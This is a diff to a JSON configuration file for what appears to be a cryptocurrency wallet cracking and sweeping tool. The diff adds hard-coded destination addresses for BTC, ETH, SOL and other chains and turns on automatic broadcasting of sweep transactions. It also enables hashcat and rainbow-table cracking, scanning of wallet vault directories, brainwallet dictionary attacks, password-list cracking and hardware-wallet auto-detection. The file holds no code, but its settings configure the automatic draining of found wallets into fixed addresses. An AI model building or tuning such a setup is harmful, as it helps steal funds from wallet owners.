@@ -6,17 +6,17 @@
     },
     "sweep": {
         "destination_wallet": {
-            "BTC": "",
-            "ETH": "",
-            "LTC": "",
-            "SOL": "",
-            "BNB": "",
-            "XRP": "",
-            "TRON": "",
-            "POLYGON": ""
+            "BTC": "bc1qn42zxq2xmmt7cdc2s9mn8y8nd6z94pwlgexdav",
+            "ETH": "0x2C1679c260601111e496720869ec43F668841bca",
+            "LTC": "ltc1qg8anrn6c3tskgyey34dknl6uazl7lv8285upew",
+            "SOL": "Ew5UdZgUL5ZwUguaAd3sF7ZazyEv24LkQWYKDHTdFnmZ",
+            "BNB": "0x2C1679c260601111e496720869ec43F668841bca",
+            "XRP": "rnTm6vNgsRVe8GiiFJVDTphUUDbHdA96it",
+            "TRON": "TM9U9kikD1KqJRc7Mp8e8mhEsTaGm11L2z",
+            "POLYGON": "0x2C1679c260601111e496720869ec43F668841bca"
         },
         "min_balance_usd": 10.0,
-        "auto_broadcast": false,
+        "auto_broadcast": true,
         "priority_fee_multiplier": 1.5,
         "check_interval": 30
     },
@@ -54,6 +54,35 @@
         "auto_start_server": false,
         "host": "127.0.0.1",
         "port": 8000
+    },
+    "performance": {
+        "max_workers": 0,
+        "balance_cache_ttl": 300,
+        "enable_hashcat": true,
+        "hashcat_path": "",
+        "hashcat_mode": "auto",
+        "enable_rainbow_cache": true,
+        "smart_password_rules": false
+    },
+    "vault_scan": {
+        "scan_directories": [],
+        "max_depth": 5
+    },
+    "cracker": {
+        "password_list": "",
+        "max_attempts": 4000000
+    },
+    "brainwallet": {
+        "dictionary_path": "",
+        "max_phrases": 4000000
+    },
+    "mpc_recovery": {
+        "scan_directories": [],
+        "max_depth": 3
+    },
+    "hardware_wallet": {
+        "enabled": true,
+        "auto_detect": true
     },
     "webhook": {
         "target_url": ""
